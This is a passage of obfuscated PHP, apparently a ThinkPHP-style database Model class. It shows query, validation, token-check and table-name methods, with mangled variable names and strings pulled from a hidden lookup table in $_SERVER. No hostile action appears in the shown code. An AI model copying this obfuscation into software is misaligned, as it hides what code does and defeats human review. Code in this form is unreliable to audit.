(is_numeric($Ã¶æù¸°) || is_string($Ã¶æù¸°)) { if (strpos($Ã¶æù¸°, $—ŠùµÂ[60])) { $Ã¶’ñö[$©‹‰€¢] = array($—ŠùµÂ[286], $Ã¶æù¸°); } else { $Ã¶’ñö[$©‹‰€¢] = $Ã¶æù¸°; } $this->options[$—ŠùµÂ[285]] = $Ã¶’ñö; } $Ã¶æù¸° = $this->_parseOptions(); if (is_array($Ã¶æù¸°[$—ŠùµÂ[285]]) && isset($Ã¶æù¸°[$—ŠùµÂ[285]][$©‹‰€¢])) { $Æ¿Îª¨Õ = $Ã¶æù¸°[$—ŠùµÂ[285]][$©‹‰€¢]; } $¼ÇÚß°Ã = $this->db->delete($Ã¶æù¸°); if (!1 !== $¼ÇÚß°Ã) { $ï»›•ÄÁ = array(); if (isset($Æ¿Îª¨Õ)) { $ï»›•ÄÁ[$©‹‰€¢] = $Æ¿Îª¨Õ; } $this->_after_delete($ï»›•ÄÁ, $Ã¶æù¸°); } return $¼ÇÚß°Ã; } protected function _after_delete($èÓô”Š½, $çê¾‘Ù¶) { } public function select($ˆòŞÕƒ° = array()) { $Í˜°åèî =& $_SERVER[Å¶¨Şêº]; if (is_string($ˆòŞÕƒ°) || is_numeric($ˆòŞÕƒ°)) { $Í¾¬¹Ô¬ = $this->getPk(); if (strpos($ˆòŞÕƒ°, $Í˜°åèî[60])) { $Şá«éı™[$Í¾¬¹Ô¬] = array($Í˜°åèî[286], $ˆòŞÕƒ°); } else { $Şá«éı™[$Í¾¬¹Ô¬] = $ˆòŞÕƒ°; } $this->options[$Í˜°åèî[285]] = $Şá«éı™; } elseif (!1 === $ˆòŞÕƒ°) { $ˆòŞÕƒ° = $this->_parseOptions(); return $Í˜°åèî[287] . $this->db->buildSelectSql($ˆòŞÕƒ°) . $Í˜°åèî[288]; } $ˆòŞÕƒ° = $this->_parseOptions(); $‰£×öœ´ = $this->db->select($ˆòŞÕƒ°); if (!1 === $‰£×öœ´) { return !1; } if (empty($‰£×öœ´)) { return null; } $this->_afterSelect($‰£×öœ´, $ˆòŞÕƒ°); return $‰£×öœ´; } protected function _afterSelect(&$àÅœº…°, $£Áª·ÂÔ) { } public function buildSql($»¿ˆ“¬ = array()) { $­Úµ¢ç± =& $_SERVER[Å¶¨Şêº]; $»¿ˆ“¬ = $this->_parseOptions($»¿ˆ“¬); return $­Úµ¢ç±[287] . $this->db->buildSelectSql($»¿ˆ“¬) . $­Úµ¢ç±[288]; } public function optionsValue($ßà§ÈËĞ = null) { if (is_null($ßà§ÈËĞ)) { return $this->options; } elseif (is_array($ßà§ÈËĞ)) { $this->options = array_merge($this->options, $ßà§ÈËĞ); } } protected function _parseOptions($ÜŸºÁ‚Ó = array()) { $·©ôÁÇ =& $_SERVER[Å¶¨Şêº]; if (is_array($ÜŸºÁ‚Ó)) { $ÜŸºÁ‚Ó = array_merge($this->options, $ÜŸºÁ‚Ó); } $this->options = array(); if (!isset($ÜŸºÁ‚Ó[$·©ôÁÇ[289]])) { $ÜŸºÁ‚Ó[$·©ôÁÇ[289]] = $this->getTableName(); $¤¦û±É‰ = $this->fields; } else { $¤¦û±É‰ = $this->getDbFields(); } if (!empty($ÜŸºÁ‚Ó[$·©ôÁÇ[290]])) { $ÜŸºÁ‚Ó[$·©ôÁÇ[289]] .= $·©ôÁÇ[63] . $ÜŸºÁ‚Ó[$·©ôÁÇ[290]]; } $ÜŸºÁ‚Ó[$·©ôÁÇ[291]] = $this->name; if (isset($ÜŸºÁ‚Ó[$·©ôÁÇ[285]]) && is_array($ÜŸºÁ‚Ó[$·©ôÁÇ[285]]) && !empty($¤¦û±É‰) && !isset($ÜŸºÁ‚Ó[$·©ôÁÇ[292]]) && !isset($ÜŸºÁ‚Ó[$·©ôÁÇ[289]])) { foreach ($ÜŸºÁ‚Ó[$·©ôÁÇ[285]] as $€¨€öÁù => $È‡­åáû) { $€¨€öÁù = trim($€¨€öÁù); if (in_array($€¨€öÁù, $¤¦û±É‰, !0)) { if (is_scalar($È‡­åáû)) { $this->_parseType($ÜŸºÁ‚Ó[$·©ôÁÇ[285]], $€¨€öÁù); } } elseif (!is_numeric($€¨€öÁù) && $·©ôÁÇ[11] != substr($€¨€öÁù, 0, 1) && !1 === strpos($€¨€öÁù, $·©ôÁÇ[10]) && !1 === strpos($€¨€öÁù, $·©ôÁÇ[270]) && !1 === strpos($€¨€öÁù, $·©ôÁÇ[293]) && !1 === strpos($€¨€öÁù, $·©ôÁÇ[294])) { unset($ÜŸºÁ‚Ó[$·©ôÁÇ[285]][$€¨€öÁù]); } } } $this->_options_filter($ÜŸºÁ‚Ó); return $ÜŸºÁ‚Ó; } protected function _options_filter(&$¸›åÉÂß) { } protected function _parseType(&$ÈÉ¥ÌÔ, $€Ñ†´Õ­) { $È¬¸«¬ =& $_SERVER[Å¶¨Şêº]; if (empty($this->options[$È¬¸«¬[295]][$È¬¸«¬[4] . $€Ñ†´Õ­])) { $á©”ì‚ó = strtolower($this->fields[$È¬¸«¬[262]][$€Ñ†´Õ­]); if (!1 !== strpos($á©”ì‚ó, $È¬¸«¬[296])) { } elseif (!1 === strpos($á©”ì‚ó, $È¬¸«¬[297]) && !1 !== strpos($á©”ì‚ó, $È¬¸«¬[298])) { $ÈÉ¥ÌÔ[$€Ñ†´Õ­] = intval($ÈÉ¥ÌÔ[$€Ñ†´Õ­]); } elseif (!1 !== strpos($á©”ì‚ó, $È¬¸«¬[299]) || !1 !== strpos($á©”ì‚ó, $È¬¸«¬[300])) { $ÈÉ¥ÌÔ[$€Ñ†´Õ­] = floatval($ÈÉ¥ÌÔ[$€Ñ†´Õ­]); } elseif (!1 !== strpos($á©”ì‚ó, $È¬¸«¬[301])) { $ÈÉ¥ÌÔ[$€Ñ†´Õ­] = (bool) $ÈÉ¥ÌÔ[$€Ñ†´Õ­]; } } } public function find($õáâ€¿Ä = array()) { $“ÒÀÊÎÛ =& $_SERVER[Å¶¨Şêº]; if (is_numeric($õáâ€¿Ä) || is_string($õáâ€¿Ä)) { $ğ…Ç¬¤Ó[$this->getPk()] = intval($õáâ€¿Ä); $this->options[$“ÒÀÊÎÛ[285]] = $ğ…Ç¬¤Ó; } $this->options[$“ÒÀÊÎÛ[302]] = 1; $õáâ€¿Ä = $this->_parseOptions(); $ñ’»Ê›‰ = $this->db->select($õáâ€¿Ä); if (!1 === $ñ’»Ê›‰) { return !1; } if (empty($ñ’»Ê›‰)) { return null; } $this->data = $ñ’»Ê›‰[0]; $this->_afterFind($this->data, $õáâ€¿Ä); if (!empty($this->options[$“ÒÀÊÎÛ[303]])) { return $this->returnResult($this->data, $this->options[$“ÒÀÊÎÛ[303]]); } return $this->data; } protected function _afterFind(&$ñ„„²ĞÜ, $ËÉ•÷Õ¾) { } protected function returnResult($èà‰°İå, $¬¡«ğ¶ = '') { $ü—ˆ¹ =& $_SERVER[Å¶¨Şêº]; if ($¬¡«ğ¶) { if (is_callable($¬¡«ğ¶)) { return call_user_func($¬¡«ğ¶, $èà‰°İå); } switch (strtolower($¬¡«ğ¶)) { case $ü—ˆ¹[304]: return json_encode($èà‰°İå); case $ü—ˆ¹[305]: return xml_encode($èà‰°İå); } } return $èà‰°İå; } public function parseFieldsMap($¿¾ˆ“”, $·«³à¶ˆ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $†’öˆ– => $¹ş§“Ó–) { if ($·«³à¶ˆ == 1) { if (isset($¿¾ˆ“”[$¹ş§“Ó–])) { $¿¾ˆ“”[$†’öˆ–] = $¿¾ˆ“”[$¹ş§“Ó–]; unset($¿¾ˆ“”[$¹ş§“Ó–]); } } else { if (isset($¿¾ˆ“”[$†’öˆ–])) { $¿¾ˆ“”[$¹ş§“Ó–] = $¿¾ˆ“”[$†’öˆ–]; unset($¿¾ˆ“”[$†’öˆ–]); } } } } return $¿¾ˆ“”; } public function setField($°úåúøù, $ñ®Ñ®÷ = '') { if (is_array($°úåúøù)) { $êŞ½÷ã¬ = $°úåúøù; } else { $êŞ½÷ã¬[$°úåúøù] = $ñ®Ñ®÷; } return $this->save($êŞ½÷ã¬); } public function setAdd($¹€Õ‹ğ’, $†Îó—ç® = 1) { $õ›à¿’ =& $_SERVER[Å¶¨Şêº]; $‘ğ‘¡¸ = $¹€Õ‹ğ’ . $õ›à¿’[306] . $†Îó—ç®; if ($†Îó—ç® < 0) { $‘ğ‘¡¸ = $¹€Õ‹ğ’ . $†Îó—ç®; } return $this->setField($¹€Õ‹ğ’, array($õ›à¿’[307], $‘ğ‘¡¸)); } public function getField($œ–¿—’, $„²÷³³ß = null) { $öªóáš÷ =& $_SERVER[Å¶¨Şêº]; $Ùä¤©çó[$öªóáš÷[283]] = $œ–¿—’; $Ùä¤©çó = $this->_parseOptions($Ùä¤©çó); $œ–¿—’ = trim($œ–¿—’); if (strpos($œ–¿—’, $öªóáš÷[60])) { if (!isset($Ùä¤©çó[$öªóáš÷[302]])) { $Ùä¤©çó[$öªóáš÷[302]] = is_numeric($„²÷³³ß) ? $„²÷³³ß : $öªóáš÷[12]; } $ò¿¸ï¤Ò = $this->db->select($Ùä¤©çó); if (!empty($ò¿¸ï¤Ò)) { $†àéãâÀ = explode($öªóáš÷[60], $œ–¿—’); $œ–¿—’ = array_keys($ò¿¸ï¤Ò[0]); $±ò»ƒÄï = array_shift($œ–¿—’); $’ßë¦˜­ = array_shift($œ–¿—’); $Ÿ¶ùÎ©œ = array(); $ÈãÎËÎÎ = count($†àéãâÀ); foreach ($ò¿¸ï¤Ò as $ÂÜÓØŠŸ) { $˜€ËâÄØ = $ÂÜÓØŠŸ[$±ò»ƒÄï]; if (2 == $ÈãÎËÎÎ) { $Ÿ¶ùÎ©œ[$˜€ËâÄØ] = $ÂÜÓØŠŸ[$’ßë¦˜­]; } else { $Ÿ¶ùÎ©œ[$˜€ËâÄØ] = is_string($„²÷³³ß) ? implode($„²÷³³ß, $ÂÜÓØŠŸ) : $ÂÜÓØŠŸ; } } return $Ÿ¶ùÎ©œ; } } else { if (!0 !== $„²÷³³ß) { $Ùä¤©çó[$öªóáš÷[302]] = is_numeric($„²÷³³ß) ? $„²÷³³ß : 1; } if ($„²÷³³ß === $öªóáš÷[265]) { unset($Ùä¤©çó[$öªóáš÷[302]]); } $ÂÜÓØŠŸ = $this->db->select($Ùä¤©çó); if (!empty($ÂÜÓØŠŸ)) { if ($„²÷³³ß === $öªóáš÷[265]) { return reset($ÂÜÓØŠŸ[0]); } if (!0 !== $„²÷³³ß && 1 == $Ùä¤©çó[$öªóáš÷[302]]) { return reset($ÂÜÓØŠŸ[0]); } foreach ($ÂÜÓØŠŸ as $äÜÒÎÜ) { $ôÙ—Üª[] = $äÜÒÎÜ[$œ–¿—’]; } return $ôÙ—Üª; } } return null; } public function create($Áâ…èñ = '', $½»¼¿ = '') { $†ÅñĞÄ… =& $_SERVER[Å¶¨Şêº]; if (empty($Áâ…èñ)) { $Áâ…èñ = $_POST; } elseif (is_object($Áâ…èñ)) { $Áâ…èñ = get_object_vars($Áâ…èñ); } if (empty($Áâ…èñ) || !is_array($Áâ…èñ)) { $this->error = think_lang($†ÅñĞÄ…[281]); return !1; } $Áâ…èñ = $this->parseFieldsMap($Áâ…èñ, 0); $½»¼¿ = $½»¼¿ ? $½»¼¿ : (!empty($Áâ…èñ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$†ÅñĞÄ…[283]])) { $ÜÅ¥­ = $this->options[$†ÅñĞÄ…[283]]; unset($this->options[$†ÅñĞÄ…[283]]); } elseif ($½»¼¿ == THINK_MODEL_INSERT && isset($this->insertFields)) { $ÜÅ¥­ = $this->insertFields; } elseif ($½»¼¿ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ÜÅ¥­ = $this->updateFields; } if (isset($ÜÅ¥­)) { if (is_string($ÜÅ¥­)) { $ÜÅ¥­ = explode($†ÅñĞÄ…[60], $ÜÅ¥­); } if (think_config($†ÅñĞÄ…[308])) { $ÜÅ¥­[] = think_config($†ÅñĞÄ…[309]); } foreach ($Áâ…èñ as $³ºŸ€Øî => $„™ÎÖé”) { if (!in_array($³ºŸ€Øî, $ÜÅ¥­)) { unset($Áâ…èñ[$³ºŸ€Øî]); } } } if (!$this->autoValidation($Áâ…èñ, $½»¼¿)) { return !1; } if (!$this->autoCheckToken($Áâ…èñ)) { $this->error = think_lang($†ÅñĞÄ…[310]); return !1; } if ($this->autoCheckFields) { $ÜÅ¥­ = $this->getDbFields(); foreach ($Áâ…èñ as $³ºŸ€Øî => $„™ÎÖé”) { if (!in_array($³ºŸ€Øî, $ÜÅ¥­)) { unset($Áâ…èñ[$³ºŸ€Øî]); } elseif (MAGIC_QUOTES_GPC && is_string($„™ÎÖé”)) { $Áâ…èñ[$³ºŸ€Øî] = stripslashes($„™ÎÖé”); } } } $this->autoOperation($Áâ…èñ, $½»¼¿); $this->data = $Áâ…èñ; return $Áâ…èñ; } public function autoCheckToken($§Áşö½¼) { $„¤ó¡–Æ =& $_SERVER[Å¶¨Şêº]; if (isset($this->options[$„¤ó¡–Æ[311]]) && !$this->options[$„¤ó¡–Æ[311]]) { return !0; } if (think_config($„¤ó¡–Æ[308])) { $–ğ£„Õ = think_config($„¤ó¡–Æ[309]); if (!isset($§Áşö½¼[$–ğ£„Õ]) || Session::get($–ğ£„Õ)) { return !1; } list($…Ï«ÑØ¾, $İøÄ†›) = explode($„¤ó¡–Æ[11], $§Áşö½¼[$–ğ£„Õ]); if ($İøÄ†› && Session::get($–ğ£„Õ . $„¤ó¡–Æ[10] . $…Ï«ÑØ¾) === $İøÄ†›) { Session::remove($–ğ£„Õ . $„¤ó¡–Æ[10] . $…Ï«ÑØ¾); return !0; } if (think_config($„¤ó¡–Æ[312])) { Session::remove($–ğ£„Õ . $„¤ó¡–Æ[10] . $…Ï«ÑØ¾); } return !1; } return !0; } public function regex($ãÒµœ¿å, $öóƒü»à) { $Ôôƒ··ğ =& $_SERVER[Å¶¨Şêº]; $»İ¬¥ß× = array($Ôôƒ··ğ[313] => $Ôôƒ··ğ[314], $Ôôƒ··ğ[315] => $Ôôƒ··ğ[316], $Ôôƒ··ğ[317] => $Ôôƒ··ğ[318], $Ôôƒ··ğ[319] => $Ôôƒ··ğ[320], $Ôôƒ··ğ[321] => $Ôôƒ··ğ[322], $Ôôƒ··ğ[323] => $Ôôƒ··ğ[324], $Ôôƒ··ğ[325] => $Ôôƒ··ğ[326], $Ôôƒ··ğ[300] => $Ôôƒ··ğ[327], $Ôôƒ··ğ[328] => $Ôôƒ··ğ[329]); if (isset($»İ¬¥ß×[strtolower($öóƒü»à)])) { $öóƒü»à = $»İ¬¥ß×[strtolower($öóƒü»à)]; } return preg_match($öóƒü»à, $ãÒµœ¿å) === 1; } private function autoOperation(&$Áê£…–”, $Œ®Á’„ç) { $ÕéŒ­”Ÿ =& $_SERVER[Å¶¨Şêº]; if (!empty($this->options[$ÕéŒ­”Ÿ[330]])) { $‡â×ïß… = $this->options[$ÕéŒ­”Ÿ[330]]; unset($this->options[$ÕéŒ­”Ÿ[330]]); } elseif (!empty($this->_auto)) { $‡â×ïß… = $this->_auto; } if (isset($‡â×ïß…)) { foreach ($‡â×ïß… as $Ç£ö­Í) { if (empty($Ç£ö­Í[2])) { $Ç£ö­Í[2] = THINK_MODEL_INSERT; } if ($Œ®Á’„ç == $Ç£ö­Í[2] || $Ç£ö­Í[2] == THINK_MODEL_BOTH) { switch (trim($Ç£ö­Í[3])) { case $ÕéŒ­”Ÿ[331]: case $ÕéŒ­”Ÿ[332]: $¸ı—Øò = isset($Ç£ö­Í[4]) ? (array) $Ç£ö­Í[4] : array(); if (isset($Áê£…–”[$Ç£ö­Í[0]])) { array_unshift($¸ı—Øò, $Áê£…–”[$Ç£ö­Í[0]]); } if ($ÕéŒ­”Ÿ[331] == $Ç£ö­Í[3]) { $Áê£…–”[$Ç£ö­Í[0]] = call_user_func_array($Ç£ö­Í[1], $¸ı—Øò); } else { $Áê£…–”[$Ç£ö­Í[0]] = call_user_func_array(array(&$this, $Ç£ö­Í[1]), $¸ı—Øò); } break; case $ÕéŒ­”Ÿ[283]: $Áê£…–”[$Ç£ö­Í[0]] = $Áê£…–”[$Ç£ö­Í[1]]; break; case $ÕéŒ­”Ÿ[333]: if ($ÕéŒ­”Ÿ[12] === $Áê£…–”[$Ç£ö­Í[0]]) { unset($Áê£…–”[$Ç£ö­Í[0]]); } break; case $ÕéŒ­”Ÿ[334]: default: $Áê£…–”[$Ç£ö­Í[0]] = $Ç£ö­Í[1]; } if (!1 === $Áê£…–”[$Ç£ö­Í[0]]) { unset($Áê£…–”[$Ç£ö­Í[0]]); } } } } return $Áê£…–”; } protected function autoValidation($Ñûü‚‹›, $îŠå½åú) { $ø­éª«¡ =& $_SERVER[Å¶¨Şêº]; if (!empty($this->options[$ø­éª«¡[335]])) { $¿­©› = $this->options[$ø­éª«¡[335]]; unset($this->options[$ø­éª«¡[335]]); } elseif (!empty($this->_validate)) { $¿­©› = $this->_validate; } if (isset($¿­©›)) { if ($this->patchValidate) { $this->error = array(); } foreach ($¿­©› as $ßĞ³´şå => $›¹°Ü¢ã) { if (empty($›¹°Ü¢ã[5]) || $›¹°Ü¢ã[5] == THINK_MODEL_BOTH || $›¹°Ü¢ã[5] == $îŠå½åú) { if (0 == strpos($›¹°Ü¢ã[2], $ø­éª«¡[336]) && strpos($›¹°Ü¢ã[2], $ø­éª«¡[337])) { $›¹°Ü¢ã[2] = think_lang(substr($›¹°Ü¢ã[2], 2, -1)); } $›¹°Ü¢ã[3] = isset($›¹°Ü¢ã[3]) ? $›¹°Ü¢ã[3] : THINK_EXISTS_VALIDATE; $›¹°Ü¢ã[4] = isset($›¹°Ü¢ã[4]) ? $›¹°Ü¢ã[4] : $ø­éª«¡[338]; switch ($›¹°Ü¢ã[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Ñûü‚‹›, $›¹°Ü¢ã)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($ø­éª«¡[12] != trim($Ñûü‚‹›[$›¹°Ü¢ã[0]])) { if (!1 === $this->_validationField($Ñûü‚‹›, $›¹°Ü¢ã)) { return !1; } } break; default: if (isset($Ñûü‚‹›[$›¹°Ü¢ã[0]])) { if (!1 === $this->_validationField($Ñûü‚‹›, $›¹°Ü¢ã)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($¦ôÒÎÛ“, $ãÁ¾») { if (!1 === $this->_validationFieldItem($¦ôÒÎÛ“, $ãÁ¾»)) { if ($this->patchValidate) { $this->error[$ãÁ¾»[0]] = $ãÁ¾»[2]; } else { $this->error = $ãÁ¾»[2]; return !1; } } return; } protected function _validationFieldItem($‘„âğƒ, $°Å’ÇÓˆ) { $à ·¹• =& $_SERVER[Å¶¨Şêº]; switch (strtolower(trim($°Å’ÇÓˆ[4]))) { case $à ·¹•[331]: case $à ·¹•[332]: $¹í«ğ€ = isset($°Å’ÇÓˆ[6]) ? (array) $°Å’ÇÓˆ[6] : array(); if (is_string($°Å’ÇÓˆ[0]) && strpos($°Å’ÇÓˆ[0], $à ·¹•[60])) { $°Å’ÇÓˆ[0] = explode($à ·¹•[60], $°Å’ÇÓˆ[0]); } if (is_array($°Å’ÇÓˆ[0])) { foreach ($°Å’ÇÓˆ[0] as $£°Åˆ‹—) { $©ÖõÂçë[$£°Åˆ‹—] = $‘„âğƒ[$£°Åˆ‹—]; } array_unshift($¹í«ğ€, $©ÖõÂçë); } else { array_unshift($¹í«ğ€, $‘„âğƒ[$°Å’ÇÓˆ[0]]); } if ($à ·¹•[331] == $°Å’ÇÓˆ[4]) { return call_user_func_array($°Å’ÇÓˆ[1], $¹í«ğ€); } else { return call_user_func_array(array(&$this, $°Å’ÇÓˆ[1]), $¹í«ğ€); } case $à ·¹•[339]: return $‘„âğƒ[$°Å’ÇÓˆ[0]] == $‘„âğƒ[$°Å’ÇÓˆ[1]]; case $à ·¹•[340]: if (is_string($°Å’ÇÓˆ[0]) && strpos($°Å’ÇÓˆ[0], $à ·¹•[60])) { $°Å’ÇÓˆ[0] = explode($à ·¹•[60], $°Å’ÇÓˆ[0]); } $ší¡ˆ´ = array(); if (is_array($°Å’ÇÓˆ[0])) { foreach ($°Å’ÇÓˆ[0] as $£°Åˆ‹—) { $ší¡ˆ´[$£°Åˆ‹—] = $‘„âğƒ[$£°Åˆ‹—]; } } else { $ší¡ˆ´[$°Å’ÇÓˆ[0]] = $‘„âğƒ[$°Å’ÇÓˆ[0]]; } if (!empty($‘„âğƒ[$this->getPk()])) { $ší¡ˆ´[$this->getPk()] = array($à ·¹•[341], $‘„âğƒ[$this->getPk()]); } if ($this->where($ší¡ˆ´)->find()) { return !1; } return !0; default: return $this->check($‘„âğƒ[$°Å’ÇÓˆ[0]], $°Å’ÇÓˆ[1], $°Å’ÇÓˆ[4]); } } public function check($ğ¢Ø„›ê, $Ñ›ğüŠŒ, $§›Ã­Ã” = "\162\x65\147\x65\170") { $ ü…Ñë• =& $_SERVER[Å¶¨Şêº]; $§›Ã­Ã” = strtolower(trim($§›Ã­Ã”)); switch ($§›Ã­Ã”) { case $ ü…Ñë•[7]: case $ ü…Ñë•[342]: $É ğ®ßÓ = is_array($Ñ›ğüŠŒ) ? $Ñ›ğüŠŒ : explode($ ü…Ñë•[60], $Ñ›ğüŠŒ); return $§›Ã­Ã” == $ ü…Ñë•[7] ? in_array($ğ¢Ø„›ê, $É ğ®ßÓ) : !in_array($ğ¢Ø„›ê, $É ğ®ßÓ); case $ ü…Ñë•[343]: case $ ü…Ñë•[344]: if (is_array($Ñ›ğüŠŒ)) { $‹ã¦›·† = $Ñ›ğüŠŒ[0]; $×ÙÉ‡Çõ = $Ñ›ğüŠŒ[1]; } else { list($‹ã¦›·†, $×ÙÉ‡Çõ) = explode($ ü…Ñë•[60], $Ñ›ğüŠŒ); } return $§›Ã­Ã” == $ ü…Ñë•[343] ? $ğ¢Ø„›ê >= $‹ã¦›·† && $ğ¢Ø„›ê <= $×ÙÉ‡Çõ : $ğ¢Ø„›ê < $‹ã¦›·† || $ğ¢Ø„›ê > $×ÙÉ‡Çõ; case $ ü…Ñë•[345]: case $ ü…Ñë•[346]: return $§›Ã­Ã” == $ ü…Ñë•[345] ? $ğ¢Ø„›ê == $Ñ›ğüŠŒ : $ğ¢Ø„›ê != $Ñ›ğüŠŒ; case $ ü…Ñë•[347]: $´»÷©İ¯ = mb_strlen($ğ¢Ø„›ê, $ ü…Ñë•[348]); if (strpos($Ñ›ğüŠŒ, $ ü…Ñë•[60])) { list($‹ã¦›·†, $×ÙÉ‡Çõ) = explode($ ü…Ñë•[60], $Ñ›ğüŠŒ); return $´»÷©İ¯ >= $‹ã¦›·† && $´»÷©İ¯ <= $×ÙÉ‡Çõ; } else { return $´»÷©İ¯ == $Ñ›ğüŠŒ; } case $ ü…Ñë•[349]: list($ë±¸ÊÜ”, $Í»°àÏñ) = explode($ ü…Ñë•[60], $Ñ›ğüŠŒ); if (!is_numeric($ë±¸ÊÜ”)) { $ë±¸ÊÜ” = strtotime($ë±¸ÊÜ”); } if (!is_numeric($Í»°àÏñ)) { $Í»°àÏñ = strtotime($Í»°àÏñ); } return NOW_TIME >= $ë±¸ÊÜ” && NOW_TIME <= $Í»°àÏñ; case $ ü…Ñë•[350]: return in_array(get_client_ip(), explode($ ü…Ñë•[60], $Ñ›ğüŠŒ)); case $ ü…Ñë•[351]: return !in_array(get_client_ip(), explode($ ü…Ñë•[60], $Ñ›ğüŠŒ)); case $ ü…Ñë•[338]: default: return $this->regex($ğ¢Ø„›ê, $Ñ›ğüŠŒ); } } public function query($ûÓïõó©, $€ŸÂÖÍğ = false) { $Èƒ‹™‘µ =& $_SERVER[Å¶¨Şêº]; if (!is_bool($€ŸÂÖÍğ) && !is_array($€ŸÂÖÍğ)) { $€ŸÂÖÍğ = func_get_args(); array_shift($€ŸÂÖÍğ); } $ûÓïõó© = str_replace(array($Èƒ‹™‘µ[19], $Èƒ‹™‘µ[352]), $Èƒ‹™‘µ[63], $ûÓïõó©); $ûÓïõó© = $this->parseSql($ûÓïõó©, $€ŸÂÖÍğ); return $this->db->query($ûÓïõó©); } public function execute($÷‰Òğ¶‘, $é‚éÖáñ = false) { if (!is_bool($é‚éÖáñ) && !is_array($é‚éÖáñ)) { $é‚éÖáñ = func_get_args(); array_shift($é‚éÖáñ); } $÷‰Òğ¶‘ = $this->parseSql($÷‰Òğ¶‘, $é‚éÖáñ); return $this->db->execute($÷‰Òğ¶‘); } protected function parseSql($Ì‡ˆˆ‰Û, $²ˆ´Í¢Á) { $ª“®æƒ™ =& $_SERVER[Å¶¨Şêº]; if (!0 === $²ˆ´Í¢Á) { $¸ô¤™œ = $this->_parseOptions(); $Ì‡ˆˆ‰Û = $this->db->parseSql($Ì‡ˆˆ‰Û, $¸ô¤™œ); } elseif (is_array($²ˆ´Í¢Á)) { $²ˆ´Í¢Á = array_map(array($this->db, $ª“®æƒ™[353]), $²ˆ´Í¢Á); $Ì‡ˆˆ‰Û = vsprintf($Ì‡ˆˆ‰Û, $²ˆ´Í¢Á); } else { $Ì‡ˆˆ‰Û = strtr($Ì‡ˆˆ‰Û, array($ª“®æƒ™[354] => $this->getTableName(), $ª“®æƒ™[355] => think_config($ª“®æƒ™[254]))); } $this->db->setModel($this->name); return $Ì‡ˆˆ‰Û; } public function db($±ûœßß† = '', $¤¢°¶Î£ = '', $ŒøÑšª¾ = array()) { $üéöØ„õ =& $_SERVER[Å¶¨Şêº]; if ($üéöØ„õ[12] === $±ûœßß† && $this->db) { return $this->db; } static $ˆÅŠæË³ = array(); static $ƒ©û”†ª = array(); if (!isset($ƒ©û”†ª[$±ûœßß†]) || isset($ƒ©û”†ª[$±ûœßß†]) && $¤¢°¶Î£ && $ˆÅŠæË³[$±ûœßß†] != $¤¢°¶Î£) { if (!empty($¤¢°¶Î£) && is_string($¤¢°¶Î£) && !1 === strpos($¤¢°¶Î£, $üéöØ„õ[8])) { $¤¢°¶Î£ = think_config($¤¢°¶Î£); } $±ûœßß† = think_guid($¤¢°¶Î£); $ƒ©û”†ª[$±ûœßß†] = Db::getInstance($¤¢°¶Î£); } elseif (NULL === $¤¢°¶Î£) { $ƒ©û”†ª[$±ûœßß†]->close(); unset($ƒ©û”†ª[$±ûœßß†]); return; } if (!empty($ŒøÑšª¾)) { if (is_string($ŒøÑšª¾)) { parse_str($ŒøÑšª¾, $ŒøÑšª¾); } foreach ($ŒøÑšª¾ as $áÌ“‹Ïİ => $ÆÕóŞ»â) { $this->setProperty($áÌ“‹Ïİ, $ÆÕóŞ»â); } } $ˆÅŠæË³[$±ûœßß†] = $¤¢°¶Î£; $this->db = $ƒ©û”†ª[$±ûœßß†]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $Œì«”²• = get_class($this); if ($Œì«”²• == $_SERVER[Å¶¨Şêº][356]) { return $this->name; } $this->name = substr($Œì«”²•, 0, -5); } return $this->name; } public function getTableName() { $¸ä‘°ßÈ =& $_SERVER[Å¶¨Şêº]; if (empty($this->trueTableName)) { $Ï×ô¹–Ÿ = !empty($this->tablePrefix) ? $this->tablePrefix : $¸ä‘°ßÈ[12]; if (!empty($this->tableName)) { $Ï×ô¹–Ÿ .= $this->tableName; } else { $Ï×ô¹–Ÿ .= think_parse_name($this->name); } $this->trueTableName = strtolower($Ï×ô¹–Ÿ); } return (!empty($this->dbName) ? $this->dbName . $¸ä‘°ßÈ[10] : $¸ä‘°ßÈ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ôíĞ…† =& $_SERVER[Å¶¨Şêº]; return isset($this->fields[$ôíĞ…†[261]]) ? $this->fields[$ôíĞ…†[261]] : $this->pk; } public function getDbFields() { $Â§´¯ˆ =& $_SERVER[Å¶¨Şêº]; if (isset($this->options[$Â§´¯ˆ[289]])) { $õÆš÷æù = $this->db->getFields($this->options[$Â§´¯ˆ[289]]); return $õÆš÷æù ? array_keys($õÆš÷æù) : !1; } if ($this->fields) { $õÆš÷æù = $this->fields; unset($õÆš÷æù[$Â§´¯ˆ[260]], $õÆš÷æù[$Â§´¯ˆ[261]], $õÆš÷æù[$Â§´¯ˆ[262]], $õÆš÷æù[$Â§´¯ˆ[259]]); return $õÆš÷æù; } return !1; } public function data($‡€—ê‘ò = '') { $‰…ÌéÜŠ =& $_SERVER[Å¶¨Şêº]; if ($‰…ÌéÜŠ[12] === $‡€—ê‘ò && !empty($this->data)) { return $this->data; } if (is_object($‡€—ê‘ò)) { $‡€—ê‘ò = get_object_vars($‡€—ê‘ò); } elseif (is_string($‡€—ê‘ò)) { parse_str($‡€—ê‘ò, $‡€—ê‘ò); } elseif (!is_array($‡€—ê‘ò)) { think_exception(think_lang($‰…ÌéÜŠ[281])); } $this->data = $‡€—ê‘ò; return $this; } public function join($ƒæ¯á ) { $ªîá¤•Ì =& $_SERVER[Å¶¨Şêº]; if (is_array($ƒæ¯á )) { $this->options[$ªîá¤•Ì[292]] = $ƒæ¯á ; } elseif (!empty($ƒæ¯á )) { $this->options[$ªîá¤•Ì[292]][] = $ƒæ¯á ; } return $this; } public function union($ÈËÇıöõ, $–•¶ïÕ³ = false) { $°Ó©ù²® =& $_SERVER[Å¶¨Şêº]; if (empty($ÈËÇıöõ)) { return 